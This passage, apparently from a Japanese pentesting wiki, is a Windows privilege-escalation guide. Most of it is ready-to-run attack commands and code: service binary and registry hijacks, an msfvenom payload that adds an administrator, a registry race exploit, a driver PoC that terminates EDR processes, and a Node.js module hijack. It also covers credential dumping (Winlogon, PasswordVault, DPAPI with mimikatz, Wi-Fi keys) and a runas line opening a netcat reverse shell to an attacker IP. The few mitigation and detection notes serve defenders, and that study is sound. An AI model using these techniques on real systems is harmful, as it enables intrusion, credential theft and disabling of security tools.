**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注目してください。実践的な悪用の流れは次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能であることを確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / service trigger を待ちます）。

自動チェックに役立つもの：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスが通常ユーザーによる再起動を許可していない場合は、ブート時に自動的に起動するか、再起動させる failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的にトリガーできるかを確認してください。

### サービス レジストリの変更権限

サービス レジストリを変更できるか確認してください。\
次の方法で、サービス **registry** に対する **permissions** を**確認**できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行される binary を変更できます。

実行される binary の Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 任意の HKLM value write を実現する Registry symlink race（ATConfig）

一部の Windows Accessibility 機能は、後から **SYSTEM** process によって HKLM session key にコピーされる per-user **ATConfig** key を作成します。Registry **symbolic link race** により、この privileged write を **任意の HKLM path** に redirect でき、任意の HKLM **value write** primitive を取得できます。<sup>[[18]](#references)</sup>

Key locations（例：On-Screen Keyboard `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの accessibility features が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、user-controlled configuration が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は logon/secure-desktop transitions 中に作成され、user による write が可能です。

Abuse flow（CVE-2026-24291 / ATConfig）：

1. SYSTEM によって書き込ませたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例：**LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発生したら、**HKLM Session ATConfig** key を protected HKLM target への **registry link** に置き換えます。
4. SYSTEM が、redirect された HKLM path に attacker-chosen value を書き込みます。

任意の HKLM value write を取得したら、service configuration values を上書きして LPE に pivot します：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常の user が start できる service（例：**`msiserver`**）を選択し、write 後に trigger します。**Note:** public exploit implementation は race の一部として workstation を **lock** します。

Example tooling（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows services の場合、これは**任意のコードを実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行可能ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前までの各部分を実行しようとします。

たとえば、パス _C:\Program Files\Some Folder\Service.exe_ に対して、Windows は次を実行しようとします：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除外して、すべての unquoted service paths を一覧表示します：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**metasploitを使用して、この脆弱性を検出およびexploitできます**: `exploit/windows/local/trusted\_service\_path` metasploitを使用して、手動でservice binaryを作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows では、サービスが失敗した場合に実行するアクションをユーザーが指定できます。この機能は、バイナリを指すように設定できます。このバイナリを置き換え可能な場合、privilege escalation が可能になることがあります。詳細については、[公式ドキュメント](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## Applications

### Installed Applications

**バイナリの権限**（いずれかを上書きして privilege escalation できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認します。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

一部の config file を変更して特別な file を読み取れるか、または Administrator account によって実行される binary（schedtasks）を変更できるか確認します。

システム内の弱い folder/file permissions を見つける方法の一つは、次のコマンドを実行することです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダ内にあるすべての plugin DLL を自動的にロードします。書き込み可能な portable/copy install が存在する場合、悪意のある plugin を配置することで、起動のたびに `notepad++.exe` 内で自動的に code execution が発生します（`DllMain` や plugin callbacks からも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**別の user によって実行される registry または binary の一部を上書きできるか確認してください。**\
**以下のページを読んで、privileges を escalate するために利用できる autoruns locations について詳しく学んでください。**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

**third party の奇妙な／脆弱な** drivers の可能性を探します
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られる）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順については、こちらを参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な call が attacker-controlled な Object Manager path を開く race-condition bug では、lookup を意図的に遅延させることで（max-length component や深い directory chain を使用）、window を数 microseconds から数十 microseconds まで延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

一部の Windows kernel LPE chain は、個別には弱い2つの bug から構築できます。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation を leak する **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

Audit および exploitation に関する注意事項：

- **Free-under-lock + cancel afterwards**：success path が **Acquire -> CompleteRequest/free -> Release** を実行し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** を実行する箇所を探します。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達する場合、`NtCancelIoFileEx -> IopCsqCancelRoutine` で block されていた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` を driver の remove callback に渡す可能性があります。
- **解放された queue object を reclaim** するには、同じサイズの attacker-controlled な paged-pool allocation を使用します。`NPFS` Data Queue Entries は、payload と size を制御でき、後から pipe read/peek operations で probe できるため有用です。解放された object が list link を埋め込んでいる場合は、それらを **user memory 内の fake request node の cyclic list** で上書きします。これにより、driver は元の list head で終了せず、attacker が定義した request structure を繰り返し処理します。
- **Predictable write を upgrade**：fake request が bookkeeping write（timestamp / QPC / refcount-adjacent field）で使用される nested context pointer を redirect する場合、**address-controlled だが value-controlled ではない** kernel write を得られる可能性があります。その場合、最終的な code/data pointer ではなく、spray した pool object の **length/size** field を target にし、その後 spray を列挙して、破損した object から **out-of-bounds paged-pool read** が発生するまで試行します。
- **Raceable disclosure pattern**：`ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、すべて有力な candidate です。attacker が copied buffer を拡大できる場合（例えば、多数の list/resource entry を追加して serializer の最終 allocation size を増加させるなど）、reliability が向上します。これは、必ずしも machine を crash させずに、長い copy によって replacement window を広げられるためです。
- **Pointer-rich refill targets**：Windows **I/O ring** registered-buffer array は、paged-pool size が attacker-controlled（`8 * regBufferCnt`）で、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer であるため、優れた disclosure target です。これらの array の1つを leak し、周辺の `IORING_OBJECT` を復元した後、**`RegBuffers`** と **`RegBuffersCount`** を corrupt します。これにより、後続の I/O ring operation が attacker-forged な entry を消費し、arbitrary kernel read/write を提供するようになります。利用可能な write が stable byte（例えば `KUSER_SHARED_DATA+0x14` 由来）のみの場合は、**overlapping unaligned write** を使用して `0x0101010101010101` のような repeated-byte user pointer を構築し、`VirtualAlloc` で map して、そこに forged registered-buffer array を配置します。<sup>[[30]](#references)</sup>

有用な debugging indicator：
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
破損した I/O ring から任意の kernel read/write を取得したら、標準的な post-primitive workflow を使って SYSTEM token を窃取します。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive の脆弱性を利用すると、決定論的なレイアウトを groom し、書き込み可能な HKLM/HKU の子孫を悪用し、custom driver なしで metadata corruption を kernel paged-pool overflow に変換できます。完全な chain についてはこちらを参照してください：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### attacker-controlled paths からの `RtlQueryRegistryValues` direct-mode type confusion

一部の driver は userland から registry path を受け取り、それが正常な UTF-16 string であることだけを検証してから、`RTL_QUERY_REGISTRY_DIRECT` を指定して `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` を stack 上の `int readValue` のような scalar に対して呼び出します。`RTL_QUERY_REGISTRY_TYPECHECK` がない場合、`EntryContext` は developer が想定した型ではなく、**実際の** registry type に従って解釈されます。

これにより、2 つの有用な primitive が生じます：<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**：user-controlled な absolute `\Registry\...` path により、driver は attacker が選択した key を query でき、return code/log を通じて存在を leak し、場合によっては caller が直接 access できない value も読み取れます。
- **Kernel memory corruption**：`&readValue` のような scalar destination は、registry value type に応じて、`REG_QWORD`、`UNICODE_STRING`、またはサイズ指定された binary buffer として type-confused されます。

実際の exploitation に関する注意点：

- **Windows 8+ mitigation**：`RTL_QUERY_REGISTRY_TYPECHECK` なしで query が **untrusted hive** に到達すると、kernel caller は `KERNEL_SECURITY_CHECK_FAILURE (0x139)` で crash します。exploitability を維持するには、value を `HKCU` 配下に staging するのではなく、**trusted system hive 内の attacker-writable key** を探してください。
- **Trusted-hive staging**：NtObjectManager を使用して `\Registry\Machine` の writable な子孫を列挙し、duplicated **low-integrity** token で scan を再実行して、sandboxed context から到達可能な key を見つけます：<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byteの`int`への8バイトの直接書き込みにより、隣接するスタックデータが破損し、近傍のcallback/function pointerを部分的に上書きできる。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定する。コードがまず攻撃者制御の`REG_DWORD`をスタック上のscalarに読み込み、その後同じバッファを文字列読み取りに再利用すると、攻撃者が`Length`/`MaximumLength`を制御し、`Buffer` pointerにも部分的な影響を与えられるため、半制御のkernel writeが発生する。
- **`REG_BINARY`**: 大きなbinary dataの場合、direct modeは`EntryContext`にある最初の`LONG`をsigned buffer sizeとして扱う。以前の`REG_DWORD` readによって、再利用されたscalarに**負の値**が攻撃者制御で残っていると、次の`REG_BINARY` queryは攻撃者のbytesを隣接するスタックスロットへ直接コピーする。これは、多くの場合、callback-pointerを完全に上書きする最も簡単な経路となる。

強力なhunting pattern: **同じスタック変数への、再初期化を伴わない異種registry reads**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用された`EntryContext` pointers、および最初のregistry readが2回目のreadを実行するかどうかを制御するcode pathをGrepする。

#### device objectsでのFILE_DEVICE_SECURE_OPENの欠落の悪用 (LPE + EDR kill)

一部のsigned third-party driversは、IoCreateDeviceSecureによって強力なSDDLを持つdevice objectを作成する一方、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れる。このflagがない場合、追加のcomponentを含むpathを通じてdeviceがopenされる際にsecure DACLが強制されないため、権限のないユーザーでも次のようなnamespace pathを使用してhandleを取得できる:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (実際の事例より)

ユーザーがdeviceをopenできると、driverが公開するprivileged IOCTLをLPEやtamperingに悪用できる。実環境で確認されたcapabilitiesの例:
- 任意のprocessへのfull-access handlesを返す (token theft / DuplicateTokenEx/CreateProcessAsUserによるSYSTEM shell)。
- 制限のないraw disk read/write (offline tampering、boot-time persistence tricks)。
- Protected Process/Light (PP/PPL)を含む任意のprocessをterminateし、kernel経由でuser landからAV/EDR killを可能にする。

最小限のPoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACLによる制限を意図したdevice objectsを作成する場合は、必ずFILE_DEVICE_SECURE_OPENを設定する。
- 特権操作では、caller contextを検証する。プロセスの終了やhandleの返却を許可する前に、PP/PPL checksを追加する。
- IOCTLs（access masks、METHOD_*、input validation）を制限し、kernel privilegesへの直接アクセスではなく、brokered modelsの利用を検討する。

defenders向けの検知案
- 不審なdevice names（例：\\ .\\amsdk*）に対するuser-mode opensと、abuseを示す特定のIOCTL sequencesを監視する。
- Microsoftのvulnerable driver blocklist（HVCI/WDAC/Smart App Control）を適用し、独自のallow/deny listsを維持する。


## PATH DLL Hijacking

**PATH上に存在するフォルダー内へのwrite permissions**がある場合、プロセスによってロードされるDLLをhijackし、**privilegesをescalate**できる可能性があります。<sup>[[2]](#references)</sup>

PATH内のすべてのフォルダーのpermissionsを確認します：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron module resolution hijacking

これは、**Windows uncontrolled search path** の亜種であり、想定される module が**存在しない**状態で、`require("foo")` のような bare import を実行する **Node.js** および **Electron** アプリケーションに影響します。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上方向にたどり、各親ディレクトリにある `node_modules` フォルダーを確認して packages を解決します。Windows では、この探索がドライブのルートまで到達する可能性があるため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、最終的に以下を探索することがあります:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（または package フォルダー）を配置し、**より高い権限で動作する Node/Electron process** が存在しない dependency を解決するのを待つことができます。payload は被害 process の security context で実行されるため、対象が administrator として実行されている場合、elevated scheduled task/service wrapper から実行されている場合、または自動起動する privileged desktop app の場合、これは **LPE** になります。

これは、特に以下の場合によく発生します:

- dependency が `optionalDependencies` で宣言されている場合<sup>[[22]](#references)</sup>
- third-party library が `require("foo")` を `try/catch` でラップし、失敗時も処理を継続する場合
- package が production build から削除された、packaging 中に省略された、または install に失敗した場合
- 脆弱な `require()` が main application code ではなく、dependency tree の深い位置に存在する場合

### 脆弱な target の探索

解決 path を証明するには **Procmon** を使用します:<sup>[[23]](#references)</sup>

- `Process Name` = target executable（`node.exe`、Electron app EXE、または wrapper process）で filter
- `Path` `contains` `node_modules` で filter
- `NAME NOT FOUND` と、`C:\node_modules` 配下で最終的に成功する open に注目

unpacked `.asar` files または application sources で役立つ code-review パターン:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon またはソースレビューから **missing package name** を特定します。
2. 存在しない場合は、root lookup directory を作成します。
```powershell
mkdir C:\node_modules
```
3. 想定される正確な名前の module を配置します:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. 被害者アプリケーションを起動します。アプリケーションが `require("foo")` を試行し、正規のモジュールが存在しない場合、Node は `C:\node_modules\foo.js` を読み込む可能性があります。

このパターンに該当する、実際に存在する missing optional modules の例には `bluebird` と `utf-8-validate` があります。ただし、再利用可能な部分は **technique** です。つまり、特権 Windows Node/Electron プロセスが解決する任意の **missing bare import** を見つけます。

### Detection and hardening ideas

- ユーザーが `C:\node_modules` を作成した場合、またはそこに新しい `.js` ファイルやパッケージを書き込んだ場合にアラートを生成します。
- 高い整合性レベルで動作するプロセスが `C:\node_modules\*` から読み取っていないか調査します。
- production ではすべての runtime dependencies をパッケージ化し、`optionalDependencies` の使用を監査します。
- サードパーティーコードで、`try { require("...") } catch {}` のような無 silent なパターンを確認します。
- library が対応している場合は optional probes を無効化します（たとえば、一部の `ws` deployment では `WS_NO_UTF_8_VALIDATE=1` により legacy の `utf-8-validate` probe を回避できます）。

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされている、その他の既知のコンピューターを確認します。
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開放ポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARPテーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールルール

[**ファイアウォール関連のコマンドについてはこのページを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

[ネットワーク列挙用のコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリの `bash.exe` は、`C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root user を取得すると、任意のポートで listen できます（初めて `nc.exe` でポートを listen すると、`nc` に firewall 経由での許可を与えるかどうかを GUI で尋ねられます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
root として bash を簡単に起動するには、`--default-user root` を試せます

`WSL` のファイルシステムは、`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` フォルダーで確認できます

## Windows の認証情報

### Winlogon の認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、**Windows** がユーザーを**自動的にログインさせる**ために使用できる、サーバー、Web サイト、その他のプログラムのユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザで自動的にログインできるようにする機能のように思えるかもしれませんが、実際にはそのような仕組みではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使用できる認証情報を保存します。つまり、**リソースにアクセスするために認証情報を必要とする Windows アプリケーション**（サーバーまたは Web サイト）は、この Credential Manager と Windows Vault を**利用し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、提供された認証情報を使用できます**。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を使用することはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報を**既定のストレージ vault に要求する必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された認証情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB share 経由でリモートバイナリを呼び出しています。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された認証情報セットを使用して `runas` を実行する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) から取得できます。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても表示されます）内に、認証トークンと平文のパスワードを保存します。このストレージ領域はセッション単位で分離されており、管理者権限や `SeDebugPrivilege` の権利なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次の PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文のパスワードを即座にダンプして復号できます：
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称秘密鍵を対称暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化では、ユーザーまたはシステムの secret を利用して、entropy に大きく寄与させます。

**DPAPI は、ユーザーのログイン secret から派生した対称鍵を通じて鍵を暗号化できます**。システムの暗号化を行う場合は、システムのドメイン認証 secret を使用します。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**ユーザーの秘密鍵を保護する master key と同じファイル内に配置される DPAPI key** は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すると復号できます。

**master password によって保護された credentials files** は、通常次の場所にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
適切な `/masterkey` を使用して、**mimikatz module** `dpapi::cred` で復号できます。\
root 権限がある場合、`sekurlsa::dpapi` module を使用して **memory** から多数の **DPAPI** **masterkeys** を **extract** できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された credentials を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。credentials は **DPAPI** を使用して保護されます。通常、作成時と同じコンピューター上で同じユーザーによってのみ復号できます。

それを含むファイルから PS credentials を **decrypt** するには、次のように実行します：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
